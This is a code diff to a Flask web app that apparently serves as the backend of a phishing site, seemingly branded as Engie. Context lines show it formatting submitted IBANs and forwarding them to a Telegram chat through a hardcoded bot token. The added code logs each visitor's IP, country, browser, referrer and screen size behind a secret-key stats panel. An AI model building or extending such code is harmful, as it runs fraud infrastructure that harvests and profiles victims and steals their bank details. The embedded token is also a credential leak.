@@ -6,12 +6,21 @@
 
 import logging
 import re
-from flask import Flask, request, jsonify
+import json
+import os
+from datetime import datetime
+from flask import Flask, request, jsonify, send_from_directory
 import requests
 
 # ===================== CONFIG =====================
 BOT_TOKEN = "8641605812:AAHCdlRFCjVMJ0hByVsQYtLeifAEhObJO_8"
 CHAT_ID   = "-5322959874"
+
+# ---- Click Tracker ----
+CLICKS_KEY  = os.environ.get("CLICKS_KEY", "engie-clicks-9f3a7c42-secret")
+DATA_DIR    = os.environ.get("DATA_DIR", ".")
+CLICKS_FILE = os.path.join(DATA_DIR, "clicks.json")
+CLICKS_MAX  = 5000
 # ==================================================
 
 app = Flask(__name__)
@@ -96,6 +105,33 @@ def format_iban(iban_raw: str) -> str:
 # ============================================================
 
 
+# ============================================================
+#  CLICK TRACKER — storage
+# ============================================================
+def load_clicks():
+    if not os.path.exists(CLICKS_FILE):
+        return []
+    try:
+        with open(CLICKS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f) or []
+    except Exception:
+        return []
+
+
+def save_clicks(clicks):
+    if len(clicks) > CLICKS_MAX:
+        clicks = clicks[-CLICKS_MAX:]
+    with open(CLICKS_FILE, "w", encoding="utf-8") as f:
+        json.dump(clicks, f, ensure_ascii=False, indent=2)
+
+
+def _cors(resp):
+    resp.headers["Access-Control-Allow-Origin"]  = "*"
+    resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
+    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
+    return resp
+
+
 def send_to_telegram(text: str) -> bool:
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
@@ -120,6 +156,124 @@ def send_to_telegram(text: str) -> bool:
 @app.route("/health", methods=["GET", "HEAD"])
 def health():
     return "OK", 200
+
+
+# ============================================================
+#  CLICK TRACKER — приём кликов
+# ============================================================
+@app.route("/track", methods=["POST", "OPTIONS"])
+def track():
+    if request.method == "OPTIONS":
+        return _cors(jsonify({"ok": True}))
+
+    data = request.get_json(silent=True) or {}
+    name  = str(data.get("name", ""))[:100]
+    extra = str(data.get("extra", ""))[:200]
+    ua    = str(data.get("ua", ""))[:400]
+    ref   = str(data.get("ref", ""))[:300]
+    lang  = str(data.get("lang", ""))[:10]
+    scr   = str(data.get("screen", ""))[:20]
+
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "")
+    if "," in ip:
+        ip = ip.split(",")[0].strip()
+
+    country = request.headers.get("CF-IPCountry", "") or request.headers.get("X-Country", "")
+
+    clicks = load_clicks()
+    clicks.append({
+        "ts": datetime.now().strftime("%d.%m.%Y, %H:%M:%S"),
+        "name": name,
+        "extra": extra,
+        "ip": ip,
+        "country": country,
+        "ua": ua,
+        "ref": ref,
+        "lang": lang,
+        "screen": scr,
+    })
+    save_clicks(clicks)
+
+    return _cors(jsonify({"ok": True, "total": len(clicks)}))
+
+
+# ============================================================
+#  CLICK STATS — страница и API
+# ============================================================
+@app.route("/stats", methods=["GET"])
+def stats_page():
+    key = request.args.get("key", "")
+    if key != CLICKS_KEY:
+        return "Not Found", 404
+    return send_from_directory(".", "stats.html")
+
+
+@app.route("/stats/api", methods=["GET", "OPTIONS"])
+def stats_api():
+    if request.method == "OPTIONS":
+        return _cors(jsonify({"ok": True}))
+
+    key = request.args.get("key", "")
+    if key != CLICKS_KEY:
+        return _cors(jsonify({"ok": False, "error": "forbidden"})), 403
+
+    clicks = load_clicks()
+
+    by_name    = {}
+    by_ip      = {}
+    by_country = {}
+    by_browser = {}
+
+    for c in clicks:
+        n = c.get("name", "unknown")
+        by_name[n] = by_name.get(n, 0) + 1
+
+        ip = c.get("ip", "")
+        if ip:
+            by_ip[ip] = by_ip.get(ip, 0) + 1
+
+        cc = c.get("country", "") or "?"
+        by_country[cc] = by_country.get(cc, 0) + 1
+
+        ua = (c.get("ua", "") or "").lower()
+        if "opera" in ua or "opr" in ua:
+            b = "Opera"
+        elif "edg" in ua:
+            b = "Edge"
+        elif "chrome" in ua:
+            b = "Chrome"
+        elif "firefox" in ua:
+            b = "Firefox"
+        elif "safari" in ua:
+            b = "Safari"
+        elif "telegram" in ua:
+            b = "Telegram"
+        else:
+            b = "Other"
+        by_browser[b] = by_browser.get(b, 0) + 1
+
+    last = clicks[-200:][::-1]
+
+    return _cors(jsonify({
+        "ok": True,
+        "total": len(clicks),
+        "by_name": by_name,
+        "by_ip": by_ip,
+        "by_country": by_country,
+        "by_browser": by_browser,
+        "last": last,
+    }))
+
+
+@app.route("/stats/clear", methods=["POST", "OPTIONS"])
+def stats_clear():
+    if request.method == "OPTIONS":
+        return _cors(jsonify({"ok": True}))
+    key = request.args.get("key", "")
+    if key != CLICKS_KEY:
+        return _cors(jsonify({"ok": False, "error": "forbidden"})), 403
+    save_clicks([])
+    return _cors(jsonify({"ok": True}))
 
 
 # ============================================================
@@ -180,4 +334,6 @@ def submit():
 
 
 if __name__ == "__main__":
+    logging.info("Clicks file: %s", os.path.abspath(CLICKS_FILE))
+    logging.info("Clicks key: %s", CLICKS_KEY)
     app.run(host="0.0.0.0", port=8080, debug=False)
